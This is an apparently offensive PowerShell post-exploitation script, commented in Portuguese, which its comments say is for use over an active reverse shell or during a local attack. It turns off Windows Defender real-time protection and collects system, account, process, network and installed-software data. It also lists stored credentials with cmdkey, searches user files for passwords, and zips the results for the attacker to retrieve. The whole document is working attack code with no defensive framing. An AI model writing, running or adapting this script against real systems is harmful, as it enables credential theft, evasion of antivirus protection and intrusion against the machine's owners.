// Este script de ve ser usando quando exite um revese shell ativo ou um ataque local
// Ele rouba informções da maquina e disponibiliza para o ataquante em formato zip

# Define diretório de dump
$dumpDir = "C:\Temp\dump_info"
New-Item -ItemType Directory -Path $dumpDir -Force | Out-Null

# Desativa proteção em tempo real temporariamente
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} Catch {}

# Coleta de informações básicas do sistema
systeminfo | Out-File "$dumpDir\systeminfo.txt"
hostname | Out-File "$dumpDir\hostname.txt"
whoami /all | Out-File "$dumpDir\whoami.txt"
Get-ChildItem Env: | Out-File "$dumpDir\env_variables.txt"

# Contas e grupos locais
net user | Out-File "$dumpDir\net_user.txt"
net localgroup administrators | Out-File "$dumpDir\admins.txt"

# Processos ativos
Get-Process | Sort-Object CPU -Descending | Out-File "$dumpDir\processos.txt"

# Programas instalados
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
Select-Object DisplayName, DisplayVersion |
Out-File "$dumpDir\programas.txt"

# Rede
ipconfig /all | Out-File "$dumpDir\ipconfig.txt"
netstat -ano | Out-File "$dumpDir\netstat.txt"
route print | Out-File "$dumpDir\rotas.txt"

# Credenciais (simples)
cmdkey /list | Out-File "$dumpDir\credenciais.txt"

# Histórico
doskey /history | Out-File "$dumpDir\historico_cmd.txt"

# Busca por palavras-chave (senhas)
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue |
Select-String -Pattern 'password','senha','pass','pwd','login' |
Out-File "$dumpDir\busca_senhas.txt"

# Lista de arquivos no disco
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
Select-Object FullName, Length |
Out-File "$dumpDir\arquivos_geral.txt"

# Compacta os arquivos coletados
$zipPath = "C:\Temp\dump_coleta.zip"
Compress-Archive -Path $dumpDir\* -DestinationPath $zipPath -Force

Write-Output "`n[+] Coleta finalizada. Arquivo pronto em: $zipPath"
